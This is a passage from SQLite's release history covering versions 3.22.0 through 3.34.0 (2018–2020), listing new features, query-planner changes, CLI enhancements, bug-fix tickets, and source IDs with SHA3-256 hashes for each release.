SQLITE_SOURCE_ID: 2020-12-01 16:14:00 a26b6597e3ae272231b96f9982c3bcc17ddec2f2b6eb4df06a224b91089fed5b SHA3-256 for sqlite3.c: fbd895b0655a337b2cd657675f314188a4e9fe614444cc63dfeb3f066f674514 2020-08-14 (3.33.0) Support for UPDATE FROM following the PostgreSQL syntax. Increase the maximum size of database files to 281 TB. Extended the PRAGMA integrity_check statement so that it can optionally be limited to verifying just a single table and its indexes, rather than the entire database file. Added the decimal extension for doing arbitrary-precision decimal arithmetic. Enhancements to the ieee754 extension for working with IEEE 754 binary64 numbers. CLI enhancements: Added four new output modes: \"box\", \"json\", \"markdown\", and \"table\". The \"column\" output mode automatically expands columns to contain the longest output row and automatically turns \".header\" on if it has not been previously set. The \"quote\" output mode honors \".separator\" The decimal extension and the ieee754 extension are built-in to the CLI Query planner improvements: Add the ability to find a full-index-scan query plan for queries using INDEXED BY which previously would fail with \"no query solution\". Do a better job of detecting missing, incomplete, and/or dodgy sqlite_stat1 data and generates good query plans in spite of the misinformation. Improved performance of queries like \"SELECT min(x) FROM t WHERE y IN (?,?,?)\" assuming an index on t(x,y). In WAL mode, if a writer crashes and leaves the shm file in an inconsistent state, subsequent transactions are now able to recover the shm file even if there are active read transactions. Before this enhancement, shm file recovery that scenario would result in an SQLITE_PROTOCOL error. Hashes: SQLITE_SOURCE_ID: 2020-08-14 13:23:32 fca8dc8b578f215a969cd899336378966156154710873e68b3d9ac5881b0ff3f SHA3-256 for sqlite3.c: d00b7fffa6d33af2303430eaf394321da2960604d25a4471c7af566344f2abf9 2020-06-18 (3.32.3) Various minor bug fixes including fixes for tickets 8f157e8010b22af0, 9fb26d37cefaba40, e367f31901ea8700, b706351ce2ecf59a, 7c6d876f84e6e7e2, and c8d3b9f0a750a529. Hashes: SQLITE_SOURCE_ID: 2020-06-18 14:00:33 7ebdfa80be8e8e73324b8d66b3460222eb74c7e9dfd655b48d6ca7e1933cc8fd SHA3-256 for sqlite3.c: b62b77ee1c561a69a71bb557694aaa5141f1714c1ff6cc1ba8aa8733c92d4f52 2020-06-04 (3.32.2) Fix a long-standing bug in the byte-code engine that can cause a COMMIT command report as success when in fact it failed to commit. Ticket 810dc8038872e212 Hashes: SQLITE_SOURCE_ID: 2020-06-04 12:58:43 ec02243ea6ce33b090870ae55ab8aa2534b54d216d45c4aa2fdbb00e86861e8c SHA3-256 for sqlite3.c: f17a2a57f7eebc72d405f3b640b4a49bcd02364a9c36e04feeb145eccafa3f8d 2020-05-25 (3.32.1) Fix two long-standing bugs that allow malicious SQL statements to crash the process that is running SQLite. These bugs were announced by a third-party approximately 24 hours after the 3.32.0 release but are not specific to the 3.32.0 release. Other minor compiler-warning fixes and whatnot. Hashes: SQLITE_SOURCE_ID: 2020-05-25 16:19:56 0c1fcf4711a2e66c813aed38cf41cd3e2123ee8eb6db98118086764c4ba83350 SHA3-256 for sqlite3.c: f695ae21abf045e4ee77980a67ab2c6e03275009e593ee860a2eabf840482372 2020-05-22 (3.32.0) Added support for approximate ANALYZE using the PRAGMA analysis_limit command. Added the bytecode virtual table. Add the checksum VFS shim to the set of run-time loadable extensions included in the source tree. Added the iif() SQL function. INSERT and UPDATE statements now always apply column affinity before computing CHECK constraints. This bug fix could, in theory, cause problems for legacy databases with unorthodox CHECK constraints the require the input type for an INSERT is different from the declared column type. See ticket 86ba67afafded936 for more information. Added the sqlite3_create_filename(), sqlite3_free_filename(), and sqlite3_database_file_object() interfaces to better support of VFS shim implementations. Increase the default upper bound on the number of parameters from 999 to 32766. Added code for the UINT collating sequence as an optional loadable extension. Enhancements to the CLI: Add options to the .import command: --csv, --ascii, --skip The .dump command now accepts multiple LIKE-pattern arguments and outputs the union of all matching tables. Add the .oom command in debugging builds Add the --bom option to the .excel, .output, and .once commands. Enhance the .filectrl command to support the --schema option. The UINT collating sequence extension is automatically loaded The ESCAPE clause of a LIKE operator now overrides wildcard characters, so that the behavior matches what PostgreSQL does. SQLITE_SOURCE_ID: 2020-05-22 17:46:16 5998789c9c744bce92e4cff7636bba800a75574243d6977e1fc8281e360f8d5a SHA3-256 for sqlite3.c: 33ed868b21b62ce1d0352ed88bdbd9880a42f29046497a222df6459fc32a356f 2020-01-27 (3.31.1) Revert the data layout for an internal-use-only SQLite data structure. Applications that use SQLite should never reference internal SQLite data structures, but some do anyhow, and a change to one such data structure in 3.30.0 broke a popular and widely-deployed application. Reverting that change in SQLite, at least temporarily, gives developers of misbehaving applications time to fix their code. Fix a typos in the sqlite3ext.h header file that prevented the sqlite3_stmt_isexplain() and sqlite3_value_frombind() interfaces from being called from run-time loadable extensions. Hashes: SQLITE_SOURCE_ID: 2020-01-27 19:55:54 3bfa9cc97da10598521b342961df8f5f68c7388fa117345eeb516eaa837bb4d6 SHA3-256 for sqlite3.c: de465c64f09529429a38cbdf637acce4dfda6897f93e3db3594009e0fed56d27 2020-01-22 (3.31.0) Add support for generated columns. Add the sqlite3_hard_heap_limit64() interface and the corresponding PRAGMA hard_heap_limit command. Enhance the function_list pragma to show the number of arguments on each function, the type of function (scalar, aggregate, window), and the function property flags SQLITE_DETERMINISTIC, SQLITE_DIRECTONLY, SQLITE_INNOCUOUS, and/or SQLITE_SUBTYPE. Add the aggregated mode feature to the DBSTAT virtual table. Add the SQLITE_OPEN_NOFOLLOW option to sqlite3_open_v2() that prevents SQLite from opening symbolic links. Added the \"#-N\" array notation for JSON function path arguments. Added the SQLITE_DBCONFIG_TRUSTED_SCHEMA connection setting which is also controllable via the new trusted_schema pragma and at compile-time using the -DSQLITE_TRUSTED_SCHEMA compile-time option. Added APIs sqlite3_filename_database(), sqlite3_filename_journal(), and sqlite3_filename_wal() which are useful for specialized extensions. Add the sqlite3_uri_key() interface. Upgraded the sqlite3_uri_parameter() function so that it works with the rollback journal or WAL filename in addition to the database filename. Provide the ability to tag application-defined SQL functions with new properties SQLITE_INNOCUOUS or SQLITE_DIRECTONLY. Add new verbs to sqlite3_vtab_config() so that the xConnect method of virtual tables can declare the virtual table as SQLITE_VTAB_INNOCUOUS or SQLITE_VTAB_DIRECTONLY. Faster response to sqlite3_interrupt(). Added the uuid.c extension module implementing functions for processing RFC-4122 UUIDs. The lookaside memory allocator is enhanced to support two separate memory pools with different sized allocations in each pool. This allows more memory allocations to be covered by lookaside while at the same time reducing the heap memory usage to 48KB per connection, down from 120KB. The legacy_file_format pragma is deactivated. It is now a no-op. In its place, the SQLITE_DBCONFIG_LEGACY_FILE_FORMAT option to sqlite3_db_config() is provided. The legacy_file_format pragma is deactivated because (1) it is rarely useful and (2) it is incompatible with VACUUM in schemas that have tables with both generated columns and descending indexes. Ticket 6484e6ce678fffab Hashes: SQLITE_SOURCE_ID: 2020-01-22 18:38:59 f6affdd41608946fcfcea914ece149038a8b25a62bbe719ed2561c649b86d824 SHA3-256 for sqlite3.c: a5fca0b9f8cbf80ac89b97193378c719d4af4b7d647729d8df9c0c0fca7b1388 2019-10-10 (3.30.1) Fix a bug in the query flattener that might cause a segfault for nested queries that use the new FILTER clause on aggregate functions. Ticket 1079ad19993d13fa Cherrypick fixes for other obscure problems found since the 3.30.0 release Hashes: SQLITE_SOURCE_ID: 2019-10-10 20:19:45 18db032d058f1436ce3dea84081f4ee5a0f2259ad97301d43c426bc7f3df1b0b SHA3-256 for sqlite3.c: f96fafe4c110ed7d77fc70a7d690e5edd1e64fefb84b3b5969a722d885de1f2d 2019-10-04 (3.30.0) Add support for the FILTER clause on aggregate functions. Add support for the NULLS FIRST and NULLS LAST syntax in ORDER BY clauses. The index_info and index_xinfo pragmas are enhanced to provide information about the on-disk representation of WITHOUT ROWID tables. Add the sqlite3_drop_modules() interface, allowing applications to disable automatically loaded virtual tables that they do not need. Improvements to the .recover dot-command in the CLI so that it recovers more content from corrupt database files. Enhance the RBU extension to support indexes on expressions. Change the schema parser so that it will error out if any of the type, name, and tbl_name columns of the sqlite_master table have been corrupted and the database connection is not in writable_schema mode. The PRAGMA function_list, PRAGMA module_list, and PRAGMA pragma_list commands are now enabled in all builds by default. Disable them using -DSQLITE_OMIT_INTROSPECTION_PRAGMAS. Add the SQLITE_DBCONFIG_ENABLE_VIEW option for sqlite3_db_config(). Added the TCL Interface config method in order to be able to disable SQLITE_DBCONFIG_ENABLE_VIEW as well as control other sqlite3_db_config() options from TCL. Added the SQLITE_DIRECTONLY flag for application-defined SQL functions to prevent those functions from being used inside triggers and views. The legacy SQLITE_ENABLE_STAT3 compile-time option is now a no-op. Hashes: SQLITE_SOURCE_ID: 2019-10-04 15:03:17 c20a35336432025445f9f7e289d0cc3e4003fb17f45a4ce74c6269c407c6e09f SHA3-256 for sqlite3.c: f04393dd47205a4ee2b98ff737dc51a3fdbcc14c055b88d58f5b27d0672158f5 2019-07-10 (3.29.0) Added the SQLITE_DBCONFIG_DQS_DML and SQLITE_DBCONFIG_DQS_DDL actions to sqlite3_db_config() for activating and deactivating the double-quoted string literal misfeature. Both default to \"on\" for legacy compatibility, but developers are encouraged to turn them \"off\", perhaps using the -DSQLITE_DQS=0 compile-time option. -DSQLITE_DQS=0 is now a recommended compile-time option. Improvements to the query planner: Improved optimization of AND and OR operators when one or the other operand is a constant. Enhancements to the LIKE optimization for cases when the left-hand side column has numeric affinity. Added the \"sqlite_dbdata\" virtual table for extracting raw low-level content from an SQLite database, even a database that is corrupt. Improvements to rounding behavior, so that the results of rounding binary numbers using the round() function are closer to what people who are used to thinking in decimal actually expect. Enhancements to the CLI: Add the \".recover\" command which tries to recover as much content as possible from a corrupt database file. Add the \".filectrl\" command useful for testing. Add the long-standing \".testctrl\" command to the \".help\" menu. Added the \".dbconfig\" command Hashes: SQLITE_SOURCE_ID: 2019-07-10 17:32:03 fc82b73eaac8b36950e527f12c4b5dc1e147e6f4ad2217ae43ad82882a88bfa6 SHA3-256 for sqlite3.c: d9a5daf7697a827f4b2638276ce639fa04e8e8bb5fd3a6b683cfad10f1c81b12 2019-04-16 (3.28.0) Enhanced window functions: Add support the EXCLUDE clause. Add support for window chaining. Add support for GROUPS frames. Add support for \"<expr> PRECEDING\" and \"<expr> FOLLOWING\" boundaries in RANGE frames. Added the new sqlite3_stmt_isexplain(S) interface for determining whether or not a prepared statement is an EXPLAIN. Enhanced VACUUM INTO so that it works for read-only databases. New query optimizations: Enable the LIKE optimization for cases when the ESCAPE keyword is present and PRAGMA case_sensitive_like is on. In queries that are driven by a partial index, avoid unnecessary tests of the constraint named in the WHERE clause of the partial index, since we know that constraint must always be true. Enhancements to the TCL Interface: Added the -returntype option to the function method. Added the new bind_fallback method. Enhancements to the CLI: Added support for bound parameters and the .parameter command. Fix the readfile() function so that it returns an empty BLOB rather than throwing an out-of-memory error when reading an empty file. Fix the writefile() function so that when it creates new directories along the path of a new file, it gives them umask permissions rather than the same permissions as the file. Change --update option in the .archive command so that it skips files that are already in the archive and are unchanged. Add the new --insert option that works like --update used to work. Added the fossildelta.c extension that can create, apply, and deconstruct the Fossil DVCS file delta format that is used by the RBU extension. Added the SQLITE_DBCONFIG_WRITABLE_SCHEMA verb for the sqlite3_db_config() interface, that does the same work as PRAGMA writable_schema without using the SQL parser. Added the sqlite3_value_frombind() API for determining if the argument to an SQL function is from a bound parameter. Security and compatibilities enhancements to fts3_tokenizer(): The fts3_tokenizer() function always returns NULL unless either the legacy application-defined FTS3 tokenizers interface are enabled using the sqlite3_db_config(SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER) setting, or unless the first argument to fts3_tokenizer() is a bound parameter. The two-argument version of fts3_tokenizer() accepts a pointer to the tokenizer method object even without the sqlite3_db_config(SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER) setting if the second argument is a bound parameter Improved robustness against corrupt database files. Miscellaneous performance enhancements Established a Git mirror of the offical SQLite source tree. The canonical sources for SQLite are maintained using the Fossil DVCS at https://sqlite.org/src. The Git mirror can be seen at https://github.com/sqlite/sqlite. Hashes: SQLITE_SOURCE_ID: 2019-04-16 19:49:53 884b4b7e502b4e991677b53971277adfaf0a04a284f8e483e2553d0f83156b50 SHA3-256 for sqlite3.c: 411efca996b65448d9798eb203d6ebe9627b7161a646f5d00911e2902a57b2e9 2019-02-25 (3.27.2) Fix a bug in the IN operator that was introduced by an attempted optimization in version 3.27.0. Ticket df46dfb631f75694 Fix a bug causing a crash when a window function is misused. Ticket 4feb3159c6bc3f7e33959. Fix various documentation typos Hashes: SQLITE_SOURCE_ID: bd49a8271d650fa89e446b42e513b595a717b9212c91dd384aab871fc1d0f6d7 SHA3-256 for sqlite3.c: 1dbae33bff261f979d0042338f72c9e734b11a80720fb32498bae9150cc576e7 2019-02-08 (3.27.1) Fix a bug in the query optimizer: an adverse interaction between the OR optimization and the optimization that tries to use values read directly from an expression index instead of recomputing the expression. Ticket 4e8e4857d32d401f Hashes: SQLITE_SOURCE_ID: 2019-02-08 13:17:39 0eca3dd3d38b31c92b49ca2d311128b74584714d9e7de895b1a6286ef959a1dd SHA3-256 for sqlite3.c: 11c14992660d5ac713ea8bea48dc5e6123f26bc8d3075fe5585d1a217d090233 2019-02-07 (3.27.0) Added the VACUUM INTO command Issue an SQLITE_WARNING message on the error log if a double-quoted string literal is used. The sqlite3_normalized_sql() interface works on any prepared statement created using sqlite3_prepare_v2() or sqlite3_prepare_v3(). It is no longer necessary to use sqlite3_prepare_v3() with SQLITE_PREPARE_NORMALIZE in order to use sqlite3_normalized_sql(). Added the remove_diacritics=2 option to FTS3 and FTS5. Added the SQLITE_PREPARE_NO_VTAB option to sqlite3_prepare_v3(). Use that option to prevent circular references to shadow tables from causing resource leaks. Enhancements to the sqlite3_deserialize() interface: Add the SQLITE_FCNTL_SIZE_LIMIT file-control for setting an upper bound on the size of the in-memory database created by sqlite3_deserialize. The default upper bound is 1GiB, or whatever alternative value is specified by sqlite3_config(SQLITE_CONFIG_MEMDB_MAXSIZE) and/or SQLITE_MEMDB_DEFAULT_MAXSIZE. Honor the SQLITE_DESERIALIZE_READONLY flag, which was previously described in the documentation, but was previously a no-op. Enhance the \"deserialize\" command of the TCL Interface to give it new \"--maxsize N\" and \"--readonly BOOLEAN\" options. Enhancements to the CLI, mostly to support testing and debugging of the SQLite library itself: Add support for \".open --hexdb\". The \"dbtotxt\" utility program used to generate the text for the \"hexdb\" is added to the source tree. Add support for the \"--maxsize N\" option on \".open --deserialize\". Add the \"--memtrace\" command-line option, to show all memory allocations and deallocations. Add the \".eqp trace\" option on builds with SQLITE_DEBUG, to enable bytecode program listing with indentation and PRAGMA vdbe_trace all in one step. Add the \".progress\" command for accessing the sqlite3_progress_handler() interface. Add the \"--async\" option to the \".backup\" command. Add options \"--expanded\", \"--normalized\", \"--plain\", \"--profile\", \"--row\", \"--stmt\", and \"--close\" to the \".trace\" command. Increased robustness against malicious SQL that is run against a maliciously corrupted database. Bug fixes: Do not use a partial index to do a table scan on an IN operator. Ticket 1d958d90596593a774. Fix the query flattener so that it works on queries that contain subqueries that use window functions. Ticket 709fcd17810f65f717 Ensure that ALTER TABLE modifies table and column names embedded in WITH clauses that are part of views and triggers. Fix a parser bug that prevented the use of parentheses around table-valued functions. Fix a problem with the OR optimization on indexes on expressions. Ticket d96eba87698a428c1d. Fix a problem with the LEFT JOIN strength reduction optimization in which the optimization was being applied inappropriately due to an IS NOT NULL operator. Ticket 5948e09b8c415bc45d. Fix the REPLACE command so that it is no longer able to sneak a NULL value into a NOT NULL column even if the NOT NULL column has a default value of NULL. Ticket e6f1f2e34dceeb1ed6 Fix a problem with the use of window functions used within correlated subqueries. Ticket d0866b26f83e9c55e3 Fix the ALTER TABLE RENAME COLUMN command so that it works for tables that have redundant UNIQUE constraints. Ticket bc8d94f0fbd633fd9a Fix a bug that caused zeroblob values to be truncated when inserted into a table that uses an expression index. Ticket bb4bdb9f7f654b0bb9 Hashes: SQLITE_SOURCE_ID: \"2019-02-07 17:02:52 97744701c3bd414e6c9d7182639d8c2ce7cf124c4fce625071ae65658ac61713 \" SHA3-256 for sqlite3.c: ca011a10ee8515b33e5643444b98ee3d74dc45d3ac766c3700320def52bc6aba 2018-12-01 (3.26.0) Optimization: When doing an UPDATE on a table with indexes on expressions, do not update the expression indexes if they do not refer to any of the columns of the table being updated. Allow the xBestIndex() method of virtual table implementations to return SQLITE_CONSTRAINT to indicate that the proposed query plan is unusable and should not be given further consideration. Added the SQLITE_DBCONFIG_DEFENSIVE option which disables the ability to create corrupt database files using ordinary SQL. Added support for read-only shadow tables when the SQLITE_DBCONFIG_DEFENSIVE option is enabled. Added the PRAGMA legacy_alter_table command, which if enabled causes the ALTER TABLE command to behave like older version of SQLite (prior to version 3.25.0) for compatibility. Added PRAGMA table_xinfo that works just like PRAGMA table_info except that it also shows hidden columns in virtual tables. Added the explain virtual table as a run-time loadable extension. Add a limit counter to the query planner to prevent excessive sqlite3_prepare() times for certain pathological SQL inputs. Added support for the sqlite3_normalized_sql() interface, when compiling with SQLITE_ENABLE_NORMALIZE. Enhanced triggers so that they can use table-valued functions that exist in schemas other than the schema where the trigger is defined. Enhancements to the CLI: Improvements to the \".help\" command. The SQLITE_HISTORY environment variable, if it exists, specifies the name of the command-line editing history file The --deserialize option associated with opening a new database cause the database file to be read into memory and accessed using the sqlite3_deserialize() API. This simplifies running tests on a database without modifying the file on disk. Enhancements to the geopoly extension: Always stores polygons using the binary format, which is faster and uses less space. Added the geopoly_regular() function. Added the geopoly_ccw() function. Enhancements to the session extension: Added the SQLITE_CHANGESETAPPLY_INVERT flag Added the sqlite3changeset_start_v2() interface and the SQLITE_CHANGESETSTART_INVERT flag. Added the changesetfuzz.c test-case generator utility. Hashes: SQLITE_SOURCE_ID: \"2018-12-01 12:34:55 bf8c1b2b7a5960c282e543b9c293686dccff272512d08865f4600fb58238b4f9\" SHA3-256 for sqlite3.c: 72c08830da9b5d1cb397c612c0e870d7f5eb41a323b41aa3d8aa5ae9ccedb2c4 2018-11-05 (3.25.3) Disallow the use of window functions in the recursive part of a CTE. Ticket e8275b415a2f03bee Fix the behavior of typeof() and length() on virtual tables. Ticket 69d642332d25aa3b7315a6d385 Strengthen defenses against deliberately corrupted database files. Fix a problem in the query planner that results when a row-value expression is used with a PRIMARY KEY with redundant columns. Ticket 1a84668dcfdebaf12415d Fix the query planner so that it works correctly for IS NOT NULL operators in the ON clause of a LEFT JOIN with the SQLITE_ENABLE_STAT4 compile-time option. 65eb38f6e46de8c75e188a17ec Hashes: SQLITE_SOURCE_ID: \"2018-11-05 20:37:38 89e099fbe5e13c33e683bef07361231ca525b88f7907be7092058007b75036f2\" SHA3-256 for sqlite3.c: 45586e4df74de3a43f3a1f8c7a78c3c3f02edce01af7d10cafe68bb94476a5c5 2018-09-25 (3.25.2) Add the PRAGMA legacy_alter_table=ON command that causes the \"ALTER TABLE RENAME\" command to behave as it did in SQLite versions 3.24.0 and earlier: references to the renamed table inside the bodies of triggers and views are not updated. This new pragma provides a compatibility work around for older programs that expected the older, wonky behavior of ALTER TABLE RENAME. Fix a problem with the new window functions implementation that caused a malfunction when complicated expressions involving window functions were used inside of a view. Fixes for various other compiler warnings and minor problems associated with obscure configurations. Hashes: SQLITE_SOURCE_ID: \"2018-09-25 19:08:10 fb90e7189ae6d62e77ba3a308ca5d683f90bbe633cf681865365b8e92792d1c7\" SHA3-256 for sqlite3.c: 34c23ff91631ae10354f8c9d62fd7d65732b3d7f3acfd0bbae31ff4a62fe28af 2018-09-18 (3.25.1) Extra sanity checking added to ALTER TABLE in the 3.25.0 release sometimes raises a false-positive when the table being modified has a trigger that updates a virtual table. The false-positive caused the ALTER TABLE to rollback, thus leaving the schema unchanged. Ticket b41031ea2b537237. The fix in the 3.25.0 release for the endless-loop in the byte-code associated with the ORDER BY LIMIT optimization did not work for some queries involving window functions. An additional correction is required. Ticket 510cde277783b5fb Hashes: SQLITE_SOURCE_ID: \"2018-09-18 20:20:44 2ac9003de44da7dafa3fbb1915ac5725a9275c86bf2f3b7aa19321bf1460b386\" SHA3-256 for sqlite3.c: 1b2302e7a54cc99c84ff699a299f61f069a28e1ed090b89e4430ca80ae2aab06 2018-09-15 (3.25.0) Add support for window functions Enhancements the ALTER TABLE command: Add support for renaming columns within a table using ALTER TABLE table RENAME COLUMN oldname TO newname. Fix table rename feature so that it also updates references to the renamed table in triggers and views. Query optimizer improvements: Avoid unnecessary loads of columns in an aggregate query that are not within an aggregate function and that are not part of the GROUP BY clause. The IN-early-out optimization: When doing a look-up on a multi-column index and an IN operator is used on a column other than the left-most column, then if no rows match against the first IN value, check to make sure there exist rows that match the columns to the right before continuing with the next IN value. Use the transitive property to try to propagate constant values within the WHERE clause. For example, convert \"a=99 AND b=a\" into \"a=99 AND b=99\". Use a separate mutex on every inode in the unix VFS, rather than a single mutex shared among them all, for slightly better concurrency in multi-threaded environments. Enhance the PRAGMA integrity_check command for improved detection of problems on the page freelist. Output infinity as 1e999 in the \".dump\" command of the command-line shell. Added the SQLITE_FCNTL_DATA_VERSION file-control. Added the Geopoly module Bug fixes: The ORDER BY LIMIT optimization might have caused an infinite loop in the byte code of the prepared statement under very obscure circumstances, due to a confluence of minor defects in the query optimizer. Fix for ticket 9936b2fa443fec03ff25 On an UPSERT when the order of constraint checks is rearranged, ensure that the affinity transformations on the inserted content occur before any of the constraint checks. Fix for ticket 79cad5e4b2e219dd197242e9e. Avoid using a prepared statement for \".stats on\" command of the CLI after it has been closed by the \".eqp full\" logicc. Fix for ticket 7be932dfa60a8a6b3b26bcf76. The LIKE optimization was generating incorrect byte-code and hence getting the wrong answer if the left-hand operand has numeric affinity and the right-hand-side pattern is '/%' or if the pattern begins with the ESCAPE character. Fix for ticket c94369cae9b561b1f996d0054b Hashes: SQLITE_SOURCE_ID: \"2018-09-15 04:01:47 b63af6c3bd33152742648d5d2e8dc5d5fcbcdd27df409272b6aea00a6f761760\" SHA3-256 for sqlite3.c: 989e3ff37f2b5eea8e42205f808ccf0ba86c6ea6aa928ad2c011f33a108ac45d 2018-06-04 (3.24.0) Add support for PostgreSQL-style UPSERT. Add support for auxiliary columns in r-tree tables. Add C-language APIs for discovering SQL keywords used by SQLite: sqlite3_keyword_count(), sqlite3_keyword_name(), and sqlite3_keyword_check(). Add C-language APIs for dynamic strings based on the sqlite3_str object. Enhance ALTER TABLE so that it recognizes \"true\" and \"false\" as valid arguments to DEFAULT. Add the sorter-reference optimization as a compile-time option. Only available if compiled with SQLITE_ENABLE_SORTER_REFERENCES. Improve the format of the EXPLAIN QUERY PLAN raw output, so that it gives better information about the query plan and about the relationships between the various components of the plan. Added the SQLITE_DBCONFIG_RESET_DATABASE option to the sqlite3_db_config() API. CLI Enhancements: Automatically intercepts the raw EXPLAIN QUERY PLAN output and reformats it into an ASCII-art graph. Lines that begin with \"#\" and that are not in the middle of an SQL statement are interpreted as comments. Added the --append option to the \".backup\" command. Added the \".dbconfig\" command. Performance: UPDATE avoids unnecessary low-level disk writes when the contents of the database file do not actually change. For example, \"UPDATE t1 SET x=25 WHERE y=?\" generates no extra disk I/O if the value in column x is already 25. Similarly, when doing UPDATE on records that span multiple pages, only the subset of pages that actually change are written to disk. This is a low-level performance optimization only and does not affect the behavior of TRIGGERs or other higher level SQL structures. Queries that use ORDER BY and LIMIT now try to avoid computing rows that cannot possibly come in under the LIMIT. This can greatly improve performance of ORDER BY LIMIT queries, especially when the LIMIT is small relative to the number of unrestricted output rows. The OR optimization is allowed to proceed even if the OR expression has also been converted into an IN expression. Uses of the OR optimization are now also more clearly shown in the EXPLAIN QUERY PLAN output. The query planner is more aggressive about using automatic indexes for views and subqueries for which it is not possible to create a persistent index. Make use of the one-pass UPDATE and DELETE query plans in the R-Tree extension where appropriate. Performance improvements in the LEMON-generated parser. Bug fixes: For the right-hand table of a LEFT JOIN, compute the values of expressions directly rather than loading precomputed values out of an expression index as the expression index might not contain the correct value. Ticket 7fa8049685b50b5aeb0c2 Do not attempt to use terms from the WHERE clause to enable indexed lookup of the right-hand table of a LEFT JOIN. Ticket 4ba5abf65c5b0f9a96a7a Fix a memory leak that can occur following a failure to open error in the CSV virtual table Fix a long-standing problem wherein a corrupt schema on the sqlite_sequence table used by AUTOINCREMENT can lead to a crash. Ticket d8dc2b3a58cd5dc2918a1 Fix the json_each() function so that it returns valid results on its \"fullkey\" column when the input is a simple value rather than an array or object. Hashes: SQLITE_SOURCE_ID: \"2018-06-04 19:24:41 c7ee0833225bfd8c5ec2f9bf62b97c4e04d03bd9566366d5221ac8fb199a87ca\" SHA3-256 for sqlite3.c: 0d384704e1c66026228336d1e91771d295bf688c9c44c7a44f25a4c16c26ab3c 2018-04-10 (3.23.1) Fix two problems in the new LEFT JOIN strength reduction optimization. Tickets 1e39b966ae9ee739 and fac496b61722daf2. Fix misbehavior of the FTS5 xBestIndex method. Ticket 2b8aed9f7c9e61e8. Fix a harmless reference to an uninitialized virtual machine register. Ticket 093420fc0eb7cba7. Fix the CLI so that it builds with -DSQLITE_UNTESTABLE Fix the eval.c extension so that it works with PRAGMA empty_result_callbacks=ON. Fix the generate_series virtual table so that it correctly returns no rows if any of its constraints are NULL. Performance enhancements in the parser. Hashes: SQLITE_SOURCE_ID: \"2018-04-10 17:39:29 4bb2294022060e61de7da5c227a69ccd846ba330e31626ebcd59a94efd148b3b\" SHA3-256 for sqlite3.c: 65750d1e506f416a0b0b9dd22d171379679c733e3460549754dc68c92705b5dc 2018-04-02 (3.23.0) Add the sqlite3_serialize() and sqlite3_deserialize() interfaces when the SQLITE_ENABLE_DESERIALIZE compile-time option is used. Recognize TRUE and FALSE as constants. (For compatibility, if there exist columns named \"true\" or \"false\", then the identifiers refer to the columns rather than Boolean constants.) Support operators IS TRUE, IS FALSE, IS NOT TRUE, and IS NOT FALSE. Added the SQLITE_DBSTATUS_CACHE_SPILL option to sqlite3_db_status() for reporting the number of cache spills that have occurred. The \"alternate-form-2\" flag (\"!\") on the built-in printf implementation now causes string substitutions to measure the width and precision in characters instead of bytes. If the xColumn method in a virtual table implementation returns an error message using sqlite3_result_error() then give that error message preference over internally-generated messages. Added the -A command-line option to the CLI to make it easier to manage SQLite Archive files. Add support for INSERT OR REPLACE, INSERT OR IGNORE, and UPDATE OR REPLACE in the Zipfile virtual table. Enhance the sqlite3changeset_apply() interface so that it is hardened against attacks from deliberately corrupted changeset objects. Added the sqlite3_normalize() extension function. Query optimizer enhancements: Improve the omit-left-join optimization so that it works in cases where the right-hand table is UNIQUE but not necessarily NOT NULL. Improve the push-down optimization so that it works for many LEFT JOINs. Add the LEFT JOIN strength reduction optimization that converts a LEFT JOIN into an ordinary JOIN if there exist terms in the WHERE clause that would prevent the extra all-NULL row of the LEFT JOIN from appearing in the output set. Avoid unnecessary writes to the sqlite_sequence table when an AUTOINCREMENT table is updated with an rowid that is less than the maximum. Bug fixes: Fix the parser to accept valid row value syntax. Ticket 7310e2fb3d046a5 Fix the query planner so that it takes into account dependencies in the arguments to table-valued functions in subexpressions in the WHERE clause. Ticket 80177f0c226ff54 Fix incorrect result with complex OR-connected WHERE and STAT4. Ticket ec32177c99ccac2 Fix potential corruption in indexes on expressions due to automatic datatype conversions. Ticket 343634942dd54ab Assertion fault in FTS4. Ticket d6ec09eccf68cfc Incorrect result on the less-than operator in row values. Ticket f484b65f3d62305 Always interpret non-zero floating-point values as TRUE, even if the integer part is zero. Ticket 36fae083b450e3a Fix an issue in the fsdir(PATH) table-valued function to the fileio.c extension, that caused a segfault if the fsdir() table was used as the inner table of a join. Problem reported on the mailing list and fixed by check-in 7ce4e71c1b7251be Issue an error rather instead of an assertion-fault or null-pointer dereference when the sqlite_master table is corrupted so that the sqlite_sequence table root page is really a btree-index page. Check-in 525deb7a67fbd647 Fix the ANALYZE command so that it computes statistics on tables whose names begin with \"sqlite\". Check-in 0249d9aecf69948d Additional fixes for issues detected by OSSFuzz: Fix a possible infinite loop on VACUUM for corrupt database files. Check-in 27754b74ddf64 Disallow parameters in the WITH clause of triggers and views. Check-in b918d4b4e546d Fix a potential memory leak in row value processing. Check-in 2df6bbf1b8ca8 Improve the performance of the replace() SQL function for cases where there are many substitutions on megabyte-sized strings, in an attempt to avoid OSSFuzz timeouts during testing. Check-in fab2c2b07b5d3 Provide an appropriate error message when the sqlite_master table contains a CREATE TABLE AS statement. Formerly this caused either an assertion fault or null pointer dereference. Problem found by OSSFuzz on the GDAL project. Check-in d75e67654aa96 Incorrect assert() statement removed. Check-in 823779d31eb09cda. Fix a problem with using the LIKE optimization on an INTEGER PRIMARY KEY. Check-in b850dd159918af56. Hashes: SQLITE_SOURCE_ID: \"2018-04-02 11:04:16 736b53f57f70b23172c30880186dce7ad9baa3b74e3838cae5847cffb98f5cd2\" SHA3-256 for sqlite3.c: 4bed3dc2dc905ff55e2c21fd2725551fc0ca50912a9c96c6af712a4289cb24fa 2018-01-22 (3.22.0) The output of sqlite3_trace_v2() now shows each individual SQL statement run within a trigger. Add the ability to read from WAL mode databases even if the application lacks write permission on the database and its containing directory, as long as the -shm and -wal files exist in that directory. Added the rtreecheck() scalar SQL function to the R-Tree extension. Added the sqlite3_vtab_nochange() and sqlite3_value_nochange() interfaces to help virtual table implementations optimize UPDATE operations. Added the sqlite3_vtab_collation() interface. Added support for the \"^\" initial token syntax in FTS5. New extensions: The Zipfile virtual table can read and write a ZIP Archive. Added the fsdir(PATH) table-valued function to the fileio.c extension, for listing the files in a directory. The sqlite_btreeinfo eponymous virtual table for introspecting and estimating the sizes of the btrees in a database. The Append VFS is a VFS shim that allows an SQLite database to be appended to some other file. This allows (for example) a database to be appended to an executable that then opens and reads the database. Query planner enhancements: The optimization that uses an index to quickly compute an aggregate min() or max() is extended to work with indexes on expressions. The decision of whether to implement a FROM-clause subquery as a co-routine or using query flattening now considers whether the result set of the outer query is \"complex\" (if it contains functions or expression subqueries). A complex result set biases 